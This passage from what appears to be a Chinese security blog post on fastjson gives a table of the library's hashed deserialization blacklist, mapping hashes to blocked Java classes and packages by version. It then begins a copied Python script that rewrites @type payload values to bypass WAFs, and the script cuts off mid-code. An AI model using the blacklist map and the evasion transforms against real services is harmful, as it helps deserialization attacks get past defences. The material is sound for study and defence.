<p><code>fastjson</code> 在1.2.61开始，在<a href="https://github.com/alibaba/fastjson/commit/d1c0dff9a33d49e6e7b98a4063da01bbc9325a38%E4%B8%AD%EF%BC%8C%E6%8A%8A%E9%BB%91%E5%90%8D%E5%8D%95%E4%BB%8E%E5%8D%81%E8%BF%9B%E5%88%B6%E6%95%B0%E5%8F%98%E6%88%90%E4%BA%86%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E6%95%B0%EF%BC%8C%E5%8F%AF%E8%83%BD%E6%98%AF%E4%B8%BA%E4%BA%86%E9%98%B2%E6%AD%A2%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E8%80%85%E8%BF%9B%E8%A1%8C%E6%90%9C%E7%B4%A2" target="_blank" rel="noopener noreferrer">https://github.com/alibaba/fastjson/commit/d1c0dff9a33d49e6e7b98a4063da01bbc9325a38中，把黑名单从十进制数变成了十六进制数，可能是为了防止安全研究者进行搜索</a></p>
<p><strong>对照表</strong></p>
<table><thead><tr><th>version</th><th>hash</th><th>hex-hash</th><th>name</th></tr></thead><tbody><tr><td>1.2.42</td><td>-8720046426850100497</td><td>0x86fc2bf9beaf7aefL</td><td>org.apache.commons.collections4.comparators</td></tr><tr><td>1.2.42</td><td>-8109300701639721088</td><td>0x8f75f9fa0df03f80L</td><td>org.python.core</td></tr><tr><td>1.2.42</td><td>-7966123100503199569</td><td>0x9172a53f157930afL</td><td>org.apache.tomcat</td></tr><tr><td>1.2.42</td><td>-7766605818834748097</td><td>0x9437792831df7d3fL</td><td>org.apache.xalan</td></tr><tr><td>1.2.42</td><td>-6835437086156813536</td><td>0xa123a62f93178b20L</td><td>javax.xml</td></tr><tr><td>1.2.42</td><td>-4837536971810737970</td><td>0xbcdd9dc12766f0ceL</td><td>org.springframework.</td></tr><tr><td>1.2.42</td><td>-4082057040235125754</td><td>0xc7599ebfe3e72406L</td><td>org.apache.commons.beanutils</td></tr><tr><td>1.2.42</td><td>-2364987994247679115</td><td>0xdf2ddff310cdb375L</td><td>org.apache.commons.collections.Transformer</td></tr><tr><td>1.2.42</td><td>-1872417015366588117</td><td>0xe603d6a51fad692bL</td><td>org.codehaus.groovy.runtime</td></tr><tr><td>1.2.42</td><td>-254670111376247151</td><td>0xfc773ae20c827691L</td><td>java.lang.Thread</td></tr><tr><td>1.2.42</td><td>-190281065685395680</td><td>0xfd5bfc610056d720L</td><td>javax.net.</td></tr><tr><td>1.2.42</td><td>313864100207897507</td><td>0x45b11bc78a3aba3L</td><td>com.mchange</td></tr><tr><td>1.2.42</td><td>1203232727967308606</td><td>0x10b2bdca849d9b3eL</td><td>org.apache.wicket.util</td></tr><tr><td>1.2.42</td><td>1502845958873959152</td><td>0x14db2e6fead04af0L</td><td>java.util.jar.</td></tr><tr><td>1.2.42</td><td>3547627781654598988</td><td>0x313bb4abd8d4554cL</td><td>org.mozilla.javascript</td></tr><tr><td>1.2.42</td><td>3730752432285826863</td><td>0x33c64b921f523f2fL</td><td>java.rmi</td></tr><tr><td>1.2.42</td><td>3794316665763266033</td><td>0x34a81ee78429fdf1L</td><td>java.util.prefs.</td></tr><tr><td>1.2.42</td><td>4147696707147271408</td><td>0x398f942e01920cf0L</td><td>com.sun.</td></tr><tr><td>1.2.42</td><td>5347909877633654828</td><td>0x4a3797b30328202cL</td><td>java.util.logging.</td></tr><tr><td>1.2.42</td><td>5450448828334921485</td><td>0x4ba3e254e758d70dL</td><td>org.apache.bcel</td></tr><tr><td>1.2.42</td><td>5751393439502795295</td><td>0x4fd10ddc6d13821fL</td><td>java.net.Socket</td></tr><tr><td>1.2.42</td><td>5944107969236155580</td><td>0x527db6b46ce3bcbcL</td><td>org.apache.commons.fileupload</td></tr><tr><td>1.2.42</td><td>6742705432718011780</td><td>0x5d92e6ddde40ed84L</td><td>org.jboss</td></tr><tr><td>1.2.42</td><td>7179336928365889465</td><td>0x63a220e60a17c7b9L</td><td>org.hibernate</td></tr><tr><td>1.2.42</td><td>7442624256860549330</td><td>0x6749835432e0f0d2L</td><td>org.apache.commons.collections.functors</td></tr><tr><td>1.2.42</td><td>8838294710098435315</td><td>0x7aa7ee3627a19cf3L</td><td>org.apache.myfaces.context.servlet</td></tr><tr><td>1.2.43</td><td>-2262244760619952081</td><td>0xe09ae4604842582fL</td><td>java.net.URL</td></tr><tr><td>1.2.46</td><td>-8165637398350707645</td><td>0x8eadd40cb2a94443L</td><td>junit.</td></tr><tr><td>1.2.46</td><td>-8083514888460375884</td><td>0x8fd1960988bce8b4L</td><td>org.apache.ibatis.datasource</td></tr><tr><td>1.2.46</td><td>-7921218830998286408</td><td>0x92122d710e364fb8L</td><td>org.osjava.sj.</td></tr><tr><td>1.2.46</td><td>-7768608037458185275</td><td>0x94305c26580f73c5L</td><td>org.apache.log4j.</td></tr><tr><td>1.2.46</td><td>-6179589609550493385</td><td>0xaa3daffdb10c4937L</td><td>org.logicalcobwebs.</td></tr><tr><td>1.2.46</td><td>-5194641081268104286</td><td>0xb7e8ed757f5d13a2L</td><td>org.apache.logging.</td></tr><tr><td>1.2.46</td><td>-3935185854875733362</td><td>0xc963695082fd728eL</td><td>org.apache.commons.dbcp</td></tr><tr><td>1.2.46</td><td>-2753427844400776271</td><td>0xd9c9dbf6bbd27bb1L</td><td>com.ibatis.sqlmap.engine.datasource</td></tr><tr><td>1.2.46</td><td>-1589194880214235129</td><td>0xe9f20bad25f60807L</td><td>org.jdom.</td></tr><tr><td>1.2.46</td><td>1073634739308289776</td><td>0xee6511b66fd5ef0L</td><td>org.slf4j.</td></tr><tr><td>1.2.46</td><td>5688200883751798389</td><td>0x4ef08c90ff16c675L</td><td>javassist.</td></tr><tr><td>1.2.46</td><td>7017492163108594270</td><td>0x616323f12c2ce25eL</td><td>oracle.net</td></tr><tr><td>1.2.46</td><td>8389032537095247355</td><td>0x746bd4a53ec195fbL</td><td>org.jaxen.</td></tr><tr><td>1.2.48</td><td>1459860845934817624</td><td>0x144277b467723158L</td><td>java.net.InetAddress</td></tr><tr><td>1.2.48</td><td>8409640769019589119</td><td>0x74b50bb9260e31ffL</td><td>java.lang.Class</td></tr><tr><td>1.2.49</td><td>4904007817188630457</td><td>0x440e89208f445fb9L</td><td>com.alibaba.fastjson.annotation</td></tr><tr><td>1.2.59</td><td>5100336081510080343</td><td>0x46c808a4b5841f57L</td><td>org.apache.cxf.jaxrs.provider.</td></tr><tr><td>1.2.59</td><td>6456855723474196908</td><td>0x599b5c1213a099acL</td><td>ch.qos.logback.</td></tr><tr><td>1.2.59</td><td>8537233257283452655</td><td>0x767a586a5107feefL</td><td>net.sf.ehcache.transaction.manager.</td></tr><tr><td>1.2.60</td><td>3688179072722109200</td><td>0x332f0b5369a18310L</td><td>com.zaxxer.hikari.</td></tr><tr><td>1.2.61</td><td>-4401390804044377335</td><td>0xc2eb1e621f439309L</td><td>flex.messaging.util.concurrent.AsynchBeansWorkManagerExecutor</td></tr><tr><td>1.2.61</td><td>-1650485814983027158</td><td>0xe9184be55b1d962aL</td><td>org.apache.openjpa.ee.</td></tr><tr><td>1.2.61</td><td>-1251419154176620831</td><td>0xeea210e8da2ec6e1L</td><td>oracle.jdbc.rowset.OracleJDBCRowSet</td></tr><tr><td>1.2.61</td><td>-9822483067882491</td><td>0xffdd1a80f1ed3405L</td><td>com.mysql.cj.jdbc.admin.</td></tr><tr><td>1.2.61</td><td>99147092142056280</td><td>0x1603dc147a3e358L</td><td>oracle.jdbc.connector.OracleManagedConnectionFactory</td></tr><tr><td>1.2.61</td><td>3114862868117605599</td><td>0x2b3a37467a344cdfL</td><td>org.apache.ibatis.parsing.</td></tr><tr><td>1.2.61</td><td>4814658433570175913</td><td>0x42d11a560fc9fba9L</td><td>org.apache.axis2.jaxws.spi.handler.</td></tr><tr><td>1.2.61</td><td>6511035576063254270</td><td>0x5a5bd85c072e5efeL</td><td>jodd.db.connection.</td></tr><tr><td>1.2.61</td><td>8925522461579647174</td><td>0x7bddd363ad3998c6L</td><td>org.apache.commons.configuration.JNDIConfiguration</td></tr><tr><td>1.2.62</td><td>-9164606388214699518</td><td>0x80d0c70bcc2fea02L</td><td>org.apache.ibatis.executor.</td></tr><tr><td>1.2.62</td><td>-8649961213709896794</td><td>0x87f52a1b07ea33a6L</td><td>net.sf.cglib.</td></tr><tr><td>1.2.62</td><td>-6316154655839304624</td><td>0xa85882ce1044c450L</td><td>oracle.net.</td></tr><tr><td>1.2.62</td><td>-5764804792063216819</td><td>0xafff4c95b99a334dL</td><td>com.mysql.cj.jdbc.MysqlDataSource</td></tr><tr><td>1.2.62</td><td>-4608341446948126581</td><td>0xc00be1debaf2808bL</td><td>jdk.internal.</td></tr><tr><td>1.2.62</td><td>-4438775680185074100</td><td>0xc2664d0958ecfe4cL</td><td>aj.org.objectweb.asm.</td></tr><tr><td>1.2.62</td><td>-3319207949486691020</td><td>0xd1efcdf4b3316d34L</td><td>oracle.jdbc.</td></tr><tr><td>1.2.62</td><td>-2192804397019347313</td><td>0xe1919804d5bf468fL</td><td>org.apache.commons.collections.comparators.</td></tr><tr><td>1.2.62</td><td>-2095516571388852610</td><td>0xe2eb3ac7e56c467eL</td><td>net.sf.ehcache.hibernate.</td></tr><tr><td>1.2.62</td><td>4750336058574309</td><td>0x10e067cd55c5e5L</td><td>com.mysql.cj.log.</td></tr><tr><td>1.2.62</td><td>218512992947536312</td><td>0x3085068cb7201b8L</td><td>org.h2.jdbcx.</td></tr><tr><td>1.2.62</td><td>823641066473609950</td><td>0xb6e292fa5955adeL</td><td>org.apache.commons.logging.</td></tr><tr><td>1.2.62</td><td>1534439610567445754</td><td>0x154b6cb22d294cfaL</td><td>org.apache.ibatis.reflection.</td></tr><tr><td>1.2.62</td><td>1818089308493370394</td><td>0x193b2697eaaed41aL</td><td>org.h2.server.</td></tr><tr><td>1.2.62</td><td>2164696723069287854</td><td>0x1e0a8c3358ff3daeL</td><td>org.apache.ibatis.datasource.</td></tr><tr><td>1.2.62</td><td>2653453629929770569</td><td>0x24d2f6048fef4e49L</td><td>org.objectweb.asm.</td></tr><tr><td>1.2.62</td><td>2836431254737891113</td><td>0x275d0732b877af29L</td><td>flex.messaging.util.concurrent.</td></tr><tr><td>1.2.62</td><td>3089451460101527857</td><td>0x2adfefbbfe29d931L</td><td>org.apache.ibatis.javassist.</td></tr><tr><td>1.2.62</td><td>3256258368248066264</td><td>0x2d308dbbc851b0d8L</td><td>java.lang.UNIXProcess</td></tr><tr><td>1.2.62</td><td>3718352661124136681</td><td>0x339a3e0b6beebee9L</td><td>org.apache.ibatis.ognl.</td></tr><tr><td>1.2.62</td><td>4046190361520671643</td><td>0x3826f4b2380c8b9bL</td><td>com.mysql.cj.jdbc.MysqlConnectionPoolDataSource</td></tr><tr><td>1.2.62</td><td>4841947709850912914</td><td>0x43320dc9d2ae0892L</td><td>org.codehaus.jackson.</td></tr><tr><td>1.2.62</td><td>6280357960959217660</td><td>0x5728504a6d454ffcL</td><td>org.apache.ibatis.scripting.</td></tr><tr><td>1.2.62</td><td>6534946468240507089</td><td>0x5ab0cb3071ab40d1L</td><td>org.apache.commons.proxy.</td></tr><tr><td>1.2.62</td><td>6734240326434096246</td><td>0x5d74d3e5b9370476L</td><td>com.mysql.cj.jdbc.MysqlXADataSource</td></tr><tr><td>1.2.62</td><td>7123326897294507060</td><td>0x62db241274397c34L</td><td>org.apache.commons.collections.functors.</td></tr><tr><td>1.2.62</td><td>8488266005336625107</td><td>0x75cc60f5871d0fd3L</td><td>org.apache.commons.configuration</td></tr><tr><td>1.2.66</td><td>-2439930098895578154</td><td>0xde23a0809a8b9bd6L</td><td>javax.script.</td></tr><tr><td>1.2.66</td><td>-582813228520337988</td><td>0xf7e96e74dfa58dbcL</td><td>javax.sound.</td></tr><tr><td>1.2.66</td><td>-26639035867733124</td><td>0xffa15bf021f1e37cL</td><td>javax.print.</td></tr><tr><td>1.2.66</td><td>386461436234701831</td><td>0x55cfca0f2281c07L</td><td>javax.activation.</td></tr><tr><td>1.2.66</td><td>1153291637701043748</td><td>0x100150a253996624L</td><td>javax.tools.</td></tr><tr><td>1.2.66</td><td>1698504441317515818L</td><td>0x17924cca5227622aL</td><td>javax.management.</td></tr><tr><td>1.2.66</td><td>7375862386996623731L</td><td>0x665c53c311193973L</td><td>org.apache.xbean.</td></tr><tr><td>1.2.66</td><td>7658177784286215602L</td><td>0x6a47501ebb2afdb2L</td><td>org.eclipse.jetty.</td></tr><tr><td>1.2.66</td><td>8055461369741094911L</td><td>0x6fcabf6fa54cafffL</td><td>javax.naming.</td></tr><tr><td>1.2.67</td><td>-7775351613326101303L</td><td>0x941866e73beff4c9L</td><td>org.apache.shiro.realm.</td></tr><tr><td>1.2.67</td><td>-6025144546313590215L</td><td>0xac6262f52c98aa39L</td><td>org.apache.http.conn.</td></tr><tr><td>1.2.67</td><td>-5939269048541779808L</td><td>0xad937a449831e8a0L</td><td>org.quartz.</td></tr><tr><td>1.2.67</td><td>-5885964883385605994L</td><td>0xae50da1fad60a096L</td><td>com.taobao.eagleeye.wrapper</td></tr><tr><td>1.2.67</td><td>-3975378478825053783L</td><td>0xc8d49e5601e661a9L</td><td>org.apache.http.impl.</td></tr><tr><td>1.2.67</td><td>-2378990704010641148L</td><td>0xdefc208f237d4104L</td><td>com.ibatis.</td></tr><tr><td>1.2.67</td><td>-905177026366752536L</td><td>0xf3702a4a5490b8e8L</td><td>org.apache.catalina.</td></tr><tr><td>1.2.67</td><td>2660670623866180977L</td><td>0x24ec99d5e7dc5571L</td><td>org.apache.http.auth.</td></tr><tr><td>1.2.67</td><td>2731823439467737506L</td><td>0x25e962f1c28f71a2L</td><td>br.com.anteros.</td></tr><tr><td>1.2.67</td><td>3637939656440441093L</td><td>0x327c8ed7c8706905L</td><td>com.caucho.</td></tr><tr><td>1.2.67</td><td>4254584350247334433L</td><td>0x3b0b51ecbf6db221L</td><td>org.apache.http.cookie.</td></tr><tr><td>1.2.67</td><td>5274044858141538265L</td><td>0x49312bdafb0077d9L</td><td>org.javasimon.</td></tr><tr><td>1.2.67</td><td>5474268165959054640L</td><td>0x4bf881e49d37f530L</td><td>org.apache.cocoon.</td></tr><tr><td>1.2.67</td><td>5596129856135573697L</td><td>0x4da972745feb30c1L</td><td>org.apache.activemq.jms.pool.</td></tr><tr><td>1.2.67</td><td>6854854816081053523L</td><td>0x5f215622fb630753L</td><td>org.mortbay.jetty.</td></tr><tr><td>1.2.68</td><td>-3077205613010077203L</td><td>0xd54b91cc77b239edL</td><td>org.apache.shiro.jndi.</td></tr><tr><td>1.2.68</td><td>-2825378362173150292L</td><td>0xd8ca3d595e982bacL</td><td>org.apache.ignite.cache.jta.</td></tr><tr><td>1.2.68</td><td>2078113382421334967L</td><td>0x1cd6f11c6a358bb7L</td><td>javax.swing.J</td></tr><tr><td>1.2.68</td><td>6007332606592876737L</td><td>0x535e552d6f9700c1L</td><td>org.aoju.bus.proxy.provider.</td></tr><tr><td>1.2.68</td><td>9140390920032557669L</td><td>0x7ed9311d28bf1a65L</td><td>java.awt.p</td></tr><tr><td>1.2.68</td><td>9140416208800006522L</td><td>0x7ed9481d28bf417aL</td><td>java.awt.i</td></tr><tr><td>1.2.69</td><td>-8024746738719829346L</td><td>0x90a25f5baa21529eL</td><td>java.io.Serializable</td></tr><tr><td>1.2.69</td><td>-5811778396720452501L</td><td>0xaf586a571e302c6bL</td><td>java.io.Closeable</td></tr><tr><td>1.2.69</td><td>-3053747177772160511L</td><td>0xd59ee91f0b09ea01L</td><td>oracle.jms.AQ</td></tr><tr><td>1.2.69</td><td>-2114196234051346931L</td><td>0xe2a8ddba03e69e0dL</td><td>java.util.Collection</td></tr><tr><td>1.2.69</td><td>-2027296626235911549L</td><td>0xe3dd9875a2dc5283L</td><td>java.lang.Iterable</td></tr><tr><td>1.2.69</td><td>-2939497380989775398L</td><td>0xd734ceb4c3e9d1daL</td><td>java.lang.Object</td></tr><tr><td>1.2.69</td><td>-1368967840069965882L</td><td>0xed007300a7b227c6L</td><td>java.lang.AutoCloseable</td></tr><tr><td>1.2.69</td><td>2980334044947851925L</td><td>0x295c4605fd1eaa95L</td><td>java.lang.Readable</td></tr><tr><td>1.2.69</td><td>3247277300971823414L</td><td>0x2d10a5801b9d6136L</td><td>java.lang.Cloneable</td></tr><tr><td>1.2.69</td><td>5183404141909004468L</td><td>0x47ef269aadc650b4L</td><td>java.lang.Runnable</td></tr><tr><td>1.2.69</td><td>7222019943667248779L</td><td>0x6439c4dff712ae8bL</td><td>java.util.EventListener</td></tr><tr><td>1.2.70</td><td>-5076846148177416215L</td><td>0xb98b6b5396932fe9L</td><td>org.apache.commons.collections4.Transformer</td></tr><tr><td>1.2.70</td><td>-4703320437989596122L</td><td>0xbeba72fb1ccba426L</td><td>org.apache.commons.collections4.functors</td></tr><tr><td>1.2.70</td><td>-4314457471973557243L</td><td>0xc41ff7c9c87c7c05L</td><td>org.jdom2.transform.</td></tr><tr><td>1.2.70</td><td>-2533039401923731906L</td><td>0xdcd8d615a6449e3eL</td><td>org.apache.hadoop.shaded.com.zaxxer.hikari.</td></tr><tr><td>1.2.70</td><td>156405680656087946L</td><td>0x22baa234c5bfb8aL</td><td>com.p6spy.engine.</td></tr><tr><td>1.2.70</td><td>1214780596910349029L</td><td>0x10dbc48446e0dae5L</td><td>org.apache.activemq.pool.</td></tr><tr><td>1.2.70</td><td>3085473968517218653L</td><td>0x2ad1ce3a112f015dL</td><td>org.apache.aries.transaction.</td></tr><tr><td>1.2.70</td><td>3129395579983849527L</td><td>0x2b6dd8b3229d6837L</td><td>org.apache.activemq.ActiveMQConnectionFactory</td></tr><tr><td>1.2.70</td><td>4241163808635564644L</td><td>0x3adba40367f73264L</td><td>org.apache.activemq.spring.</td></tr><tr><td>1.2.70</td><td>7240293012336844478L</td><td>0x647ab0224e149ebeL</td><td>org.apache.activemq.ActiveMQXAConnectionFactory</td></tr><tr><td>1.2.70</td><td>7347653049056829645L</td><td>0x65f81b84c1d920cdL</td><td>org.apache.commons.jelly.</td></tr><tr><td>1.2.70</td><td>7617522210483516279L</td><td>0x69b6e0175084b377L</td><td>org.apache.axis2.transport.jms.</td></tr><tr><td>1.2.71</td><td>-4537258998789938600L</td><td>0xc1086afae32e6258L</td><td>java.io.FileReader</td></tr><tr><td>1.2.71</td><td>-4150995715611818742L</td><td>0xc664b363baca050aL</td><td>java.io.ObjectInputStream</td></tr><tr><td>1.2.71</td><td>-2995060141064716555L</td><td>0xd66f68ab92e7fef5L</td><td>java.io.FileInputStream</td></tr><tr><td>1.2.71</td><td>-965955008570215305L</td><td>0xf2983d099d29b477L</td><td>java.io.ObjectOutputStream</td></tr><tr><td>1.2.71</td><td>-219577392946377768L</td><td>0xfcf3e78644b98bd8L</td><td>java.io.DataOutputStream</td></tr><tr><td>1.2.71</td><td>2622551729063269307L</td><td>x24652ce717e713bbL</td><td>java.io.PrintWriter</td></tr><tr><td>1.2.71</td><td>2930861374593775110L</td><td>0x28ac82e44e933606L</td><td>java.io.Buffered</td></tr><tr><td>1.2.71</td><td>4000049462512838776L</td><td>0x378307cb0111e878L</td><td>java.io.InputStreamReader</td></tr><tr><td>1.2.71</td><td>4193204392725694463L</td><td>0x3a31412dbb05c7ffL</td><td>java.io.OutputStreamWriter</td></tr><tr><td>1.2.71</td><td>5545425291794704408L</td><td>0x4cf54eec05e3e818L</td><td>java.io.FileWriter</td></tr><tr><td>1.2.71</td><td>6584624952928234050L</td><td>0x5b6149820275ea42L</td><td>java.io.FileOutputStream</td></tr><tr><td>1.2.71</td><td>7045245923763966215L</td><td>0x61c5bdd721385107L</td><td>java.io.DataInputStream</td></tr></tbody></table>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="payload转换">Payload转换<a href="#payload转换" class="hash-link" aria-label="Payload转换的直接链接" title="Payload转换的直接链接">​</a></h2>
<p>有些使用了存在漏洞的fastjson版本，但是有WAF在外面，所以抄了一个师傅的脚本</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">#!usr/bin/env python  </span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># -*- coding:utf-8 -*-</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token triple-quoted-string string" style="color:#e3116c">&quot;&quot;&quot; </span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">@author: longofo</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">@file: fastjson_fuzz.py </span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">@time: 2020/05/07 </span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">&quot;&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> json</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> json </span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> JSONDecodeError</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">class</span><span class="token plain"> </span><span class="token class-name">FastJsonPayload</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">__init__</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">self</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> base_payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">try</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            json</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">loads</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">base_payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">except</span><span class="token plain"> JSONDecodeError </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> ex</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">raise</span><span class="token plain"> ex</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        self</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">base_payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> base_payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">gen_common</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">self</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> payload</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> func</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        tmp_payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> json</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">loads</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        dct_objs </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">tmp_payload</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">while</span><span class="token plain"> </span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">dct_objs</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            tmp_objs </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> dct_obj </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> dct_objs</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> key </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> dct_obj</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> key </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;@type&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        dct_obj</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">key</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> func</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">dct_obj</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">key</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token builtin">type</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">dct_obj</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">key</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token builtin">dict</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        tmp_objs</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">append</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">dct_obj</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">key</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            dct_objs </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> tmp_objs</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> json</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">dumps</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">tmp_payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic"># 对@type的value增加L开头，;结尾的payload</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">gen_payload1</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">self</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> payload</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token builtin">str</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> self</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">gen_common</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">lambda</span><span class="token plain"> v</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;L&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> v </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;;&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token 